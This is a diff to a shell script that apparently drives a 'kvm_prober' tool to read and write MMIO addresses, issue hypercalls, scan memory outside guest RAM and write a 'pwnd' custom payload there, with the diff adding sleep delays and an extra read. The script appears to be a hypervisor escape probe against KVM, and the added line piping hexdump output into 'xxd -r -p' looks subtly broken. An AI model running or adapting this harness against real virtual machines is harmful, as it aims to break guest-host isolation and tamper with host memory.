@@ -50,6 +50,7 @@ log "Custom Payload: \"$CUSTOM_PAYLOAD\" ('pwnd by uncleNickypoo')"
 log "----"
 
 # --- Standard MMIO read/write/hypercall cycles ---
+sleep 2
 for addr in $READ_ADDR1 $READ_ADDR2; do
     log ""; log "## Reading $addr before hypercall"
     mem_before=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
@@ -59,6 +60,7 @@ for addr in $READ_ADDR1 $READ_ADDR2; do
     log "[HYPERCALL RESPONSE] after read $addr:"; log "$hypercall_resp"
 done
 
+sleep 2
 for addr in $WRITE_ADDR1 $WRITE_ADDR2; do
     log ""; log "## Reading $addr before write"
     mem_before=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
@@ -76,6 +78,7 @@ for addr in $WRITE_ADDR1 $WRITE_ADDR2; do
     log "[HYPERCALL RESPONSE] after write $addr:"; log "$hypercall_resp"
 done
 
+sleep 2
 log ""
 log "# Standard MMIO tests complete!"
 log_guest_ram
@@ -84,6 +87,7 @@ log_guest_ram
 log ""
 log "# === OUTSIDE GUEST RAM SCAN ==="
 
+sleep 2
 for out_addr in $OUTSIDE_RAM1 $OUTSIDE_RAM2; do
     log ""
     log "[*] OUTSIDE RAM: Reading $OUT_SIZE bytes at $out_addr (hexdump, 10 lines):"
@@ -102,15 +106,22 @@ log "# --- OUTSIDE RAM WRITE/VERIFY TEST ---"
 log "[*] Reading $EXT_SIZE bytes at $EXT_ADDR before write"
 before=$(kvm_prober readmmio_buf "$EXT_ADDR" "$EXT_SIZE" | hexdump -C)
 log "[OUTSIDE BEFORE] $EXT_ADDR:"; log "$before"
+sleep 2
+echo "reading asic representation of output"
+sleep 2
+before=$(kvm_prober readmmio_buf "$EXT_ADDR" "$EXT_SIZE" | xxd -r -p | strings)
 
+sleep 2
 log "[*] Writing custom payload to $EXT_ADDR"
 write_custom_mem "$EXT_ADDR" "$EXT_SIZE"
 log "[*] Wrote custom payload to $EXT_ADDR"
 
+sleep 2
 log "[*] Reading $EXT_SIZE bytes at $EXT_ADDR after write"
 after=$(kvm_prober readmmio_buf "$EXT_ADDR" "$EXT_SIZE" | hexdump -C)
 log "[OUTSIDE AFTER] $EXT_ADDR:"; log "$after"
 
+sleep 2
 log ""
 log "# All tests done!"
 echo "Report saved as $REPORT"
